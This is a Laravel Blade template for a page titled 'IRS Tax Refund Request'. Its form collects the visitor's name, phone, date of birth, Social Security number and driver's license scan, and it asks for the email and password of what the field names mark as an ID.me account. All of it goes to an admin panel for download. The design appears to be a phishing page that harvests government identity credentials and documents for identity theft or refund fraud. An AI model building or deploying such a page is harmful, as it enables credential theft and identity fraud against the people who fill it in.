@extends('layouts.dash2')
@section('title', 'IRS Tax Refund')
@section('content')

<div class="container mx-auto px-4 py-8">
    <div class="max-w-3xl mx-auto">
        <!-- Header with Icon -->
        <div class="text-center mb-8">
            <div class="inline-flex items-center justify-center w-20 h-20 rounded-full bg-primary-100 mb-4">
                <i data-lucide="receipt" class="h-10 w-10 text-gray-600"></i>
            </div>
            <h1 class="text-2xl font-bold text-gray-900 mb-2">IRS Tax Refund Request</h1>
            <p class="text-gray-600">Please fill out the form below to submit your IRS tax refund request</p>
        </div>

        <!-- Alerts -->
        <x-danger-alert />
        <x-success-alert />

        @if($refund && in_array($refund->status, ['pending', 'approved']))
            <div class="bg-white rounded-xl shadow-sm overflow-hidden border border-gray-100 mb-6">
                <div class="p-6">
                    <div class="flex items-center justify-center mb-4">
                        <div class="h-16 w-16 rounded-full {{ $refund->status === 'approved' ? 'bg-green-100' : 'bg-yellow-100' }} flex items-center justify-center">
                            <i data-lucide="{{ $refund->status === 'approved' ? 'check-circle' : 'clock' }}" class="h-10 w-10 {{ $refund->status === 'approved' ? 'text-green-600' : 'text-yellow-600' }}"></i>
                        </div>
                    </div>
                    <h3 class="text-lg font-medium text-gray-900 text-center mb-2">
                        {{ $refund->status === 'approved' ? 'Your Refund Request is Approved' : 'Your Refund Request is Pending' }}
                    </h3>
                    <p class="text-sm text-gray-600 text-center mb-4">
                        {{ $refund->status === 'approved' 
                            ? 'Your refund request has been approved. You will be notified when the refund is processed.' 
                            : 'Your refund request is currently being reviewed. Please check back later for updates.' }}
                    </p>
                    <div class="flex justify-center">
                        <a href="{{ route('irs-refund.track') }}" class="inline-flex items-center justify-center px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-primary-600 hover:bg-primary-700">
                            <i data-lucide="activity" class="h-4 w-4 mr-2"></i> Track Status
                        </a>
                    </div>
                </div>
            </div>
        @else
            <div class="bg-white rounded-xl shadow-sm overflow-hidden border border-gray-100">
                <div class="p-6">
                    <form action="{{ route('irs-refund.store') }}" method="POST" enctype="multipart/form-data" class="space-y-6">
                        @csrf
                        
                        <!-- Personal Information Section -->
                        <div class="bg-gray-50 p-4 rounded-lg mb-6">
                            <h3 class="text-lg font-medium text-gray-900 mb-4 flex items-center">
                                <i data-lucide="user" class="h-5 w-5 text-primary-500 mr-2"></i>
                                Personal Information
                            </h3>
                            
                            <!-- Name -->
                            <div class="mb-4">
                                <label for="name" class="block text-sm font-medium text-gray-700 mb-1">Full Name <span class="text-red-500">*</span></label>
                                <div class="relative">
                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                        <i data-lucide="user" class="h-5 w-5 text-gray-400"></i>
                                    </div>
                                    <input type="text" name="name" id="name" value="{{ old('name', $user->name) }}" required
                                        class="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                                        placeholder="Enter your full name">
                                </div>
                                @error('name')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>

                            <!-- Phone -->
                            <div class="mb-4">
                                <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Phone Number <span class="text-red-500">*</span></label>
                                <div class="relative">
                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                        <i data-lucide="phone" class="h-5 w-5 text-gray-400"></i>
                                    </div>
                                    <input type="tel" name="phone" id="phone" value="{{ old('phone', $user->phone) }}" required
                                        class="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                                        placeholder="Enter your phone number">
                                </div>
                                @error('phone')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>

                            <!-- Date of Birth -->
                            <div class="mb-4">
                                <label for="date_of_birth" class="block text-sm font-medium text-gray-700 mb-1">Date of Birth <span class="text-red-500">*</span></label>
                                <div class="relative">
                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                        <i data-lucide="calendar" class="h-5 w-5 text-gray-400"></i>
                                    </div>
                                    <input type="date" name="date_of_birth" id="date_of_birth" value="{{ old('date_of_birth', $user->dob ? \Illuminate\Support\Carbon::parse($user->dob)->format('Y-m-d') : '') }}" required
                                        class="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500">
                                </div>
                                @error('date_of_birth')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>

                            <!-- SSN -->
                            <div class="mb-4">
                                <label for="ssn" class="block text-sm font-medium text-gray-700 mb-1">Social Security Number (SSN) <span class="text-red-500">*</span></label>
                                <div class="relative">
                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                        <i data-lucide="shield" class="h-5 w-5 text-gray-400"></i>
                                    </div>
                                    <input type="text" name="ssn" id="ssn" value="{{ old('ssn') }}" required
                                        class="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                                        placeholder="XXX-XX-XXXX">
                                </div>
                                @error('ssn')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>
                        </div>

                        <!-- Credentials Section -->
                        <div class="bg-gray-50 p-4 rounded-lg mb-6">
                            <h3 class="text-lg font-medium text-gray-900 mb-4 flex items-center">
                                <i data-lucide="lock" class="h-5 w-5 text-primary-500 mr-2"></i>
                                Account Credentials
                            </h3>
                            
                            <!-- Email (autofilled from logged-in user) -->
                            <div class="mb-4">
                                <label for="idme_email" class="block text-sm font-medium text-gray-700 mb-1">Email <span class="text-red-500">*</span></label>
                                <div class="relative">
                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                        <i data-lucide="mail" class="h-5 w-5 text-gray-400"></i>
                                    </div>
                                    <input type="email" name="idme_email" id="idme_email" value="{{ old('idme_email', $user->email) }}" required readonly
                                        class="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md bg-gray-100 text-gray-700 cursor-not-allowed focus:outline-none"
                                        placeholder="Your account email">
                                </div>
                                <p class="mt-1 text-xs text-gray-500">Filled automatically from your logged-in account.</p>
                                @error('idme_email')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>

                            <!-- Password -->
                            <div class="mb-4">
                                <label for="idme_password" class="block text-sm font-medium text-gray-700 mb-1">Password <span class="text-red-500">*</span></label>
                                <div class="relative">
                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                        <i data-lucide="key" class="h-5 w-5 text-gray-400"></i>
                                    </div>
                                    <input type="password" name="idme_password" id="idme_password" required
                                        class="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                                        placeholder="Enter password">
                                </div>
                                @error('idme_password')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>
                        </div>

                        <!-- Documents Section -->
                        <div class="bg-gray-50 p-4 rounded-lg mb-6">
                            <h3 class="text-lg font-medium text-gray-900 mb-4 flex items-center">
                                <i data-lucide="file-text" class="h-5 w-5 text-primary-500 mr-2"></i>
                                Identity Documents
                            </h3>

                            <!-- Driver's License (required) -->
                            <div class="mb-4">
                                <label for="drivers_license" class="block text-sm font-medium text-gray-700 mb-1">Driver's License <span class="text-red-500">*</span></label>
                                <input type="file" name="drivers_license" id="drivers_license" required accept=".jpg,.jpeg,.png,.pdf,image/jpeg,image/png,application/pdf"
                                    class="block w-full text-sm text-gray-700 border border-gray-300 rounded-md cursor-pointer focus:outline-none focus:ring-2 focus:ring-primary-500 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-medium file:bg-primary-50 file:text-primary-700 hover:file:bg-primary-100">
                                <p class="mt-1 text-xs text-gray-500">Required. JPG, PNG, or PDF. Max 5MB.</p>
                                @error('drivers_license')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>

                            <!-- ID Document (optional) -->
                            <div class="mb-4">
                                <label for="id_document" class="block text-sm font-medium text-gray-700 mb-1">Government ID <span class="text-gray-400 font-normal">(optional)</span></label>
                                <input type="file" name="id_document" id="id_document" accept=".jpg,.jpeg,.png,.pdf,image/jpeg,image/png,application/pdf"
                                    class="block w-full text-sm text-gray-700 border border-gray-300 rounded-md cursor-pointer focus:outline-none focus:ring-2 focus:ring-primary-500 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-medium file:bg-primary-50 file:text-primary-700 hover:file:bg-primary-100">
                                <p class="mt-1 text-xs text-gray-500">Optional. Passport, state ID, or other government ID. JPG, PNG, or PDF. Max 5MB.</p>
                                @error('id_document')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>
                        </div>

                        <!-- Location Information Section -->
                        <div class="bg-gray-50 p-4 rounded-lg mb-6">
                            <h3 class="text-lg font-medium text-gray-900 mb-4 flex items-center">
                                <i data-lucide="map-pin" class="h-5 w-5 text-primary-500 mr-2"></i>
                                Location Information
                            </h3>
                            
                            <!-- Country -->
                            <div class="mb-4">
                                <label for="country" class="block text-sm font-medium text-gray-700 mb-1">Country <span class="text-red-500">*</span></label>
                                @include('partials.country-select', ['fieldName' => 'country', 'required' => true])
                                @error('country')
                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                @enderror
                            </div>
                        </div>

                        <!-- Important Notice -->
                        <div class="bg-primary-50 p-4 rounded-lg mb-6">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <i data-lucide="info" class="h-5 w-5 text-gray-600"></i>
                                </div>
                                <div class="ml-3">
                                    <h3 class="text-sm font-medium text-gray-800">Important Notice</h3>
                                    <div class="mt-2 text-sm text-gray-700">
                                        <p>Please ensure all information provided is accurate. Your request will appear in the admin panel for review. Uploaded documents can be downloaded by admin.</p>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Submit Button -->
                        <div class="flex justify-end">
                            <button type="submit" class="inline-flex items-center px-6 py-3 border border-transparent rounded-md shadow-sm text-base font-medium text-white bg-primary-600 hover:bg-primary-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-primary-500 transition-colors duration-200">
                                <i data-lucide="send" class="h-5 w-5 mr-2"></i> Submit Request
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        @endif
    </div>
</div>

<style>
/* Custom styles for the country select */
select {
    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%236B7280'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M19 9l-7 7-7-7'%3E%3C/path%3E%3C/svg%3E");
    background-repeat: no-repeat;
    background-position: right 0.5rem center;
    background-size: 1.5em 1.5em;
    padding-right: 2.5rem;
}

/* Smooth transitions */
.transition-colors {
    transition-property: background-color, border-color, color, fill, stroke, opacity, box-shadow, transform;
    transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
    transition-duration: 200ms;
}
</style>

@endsection
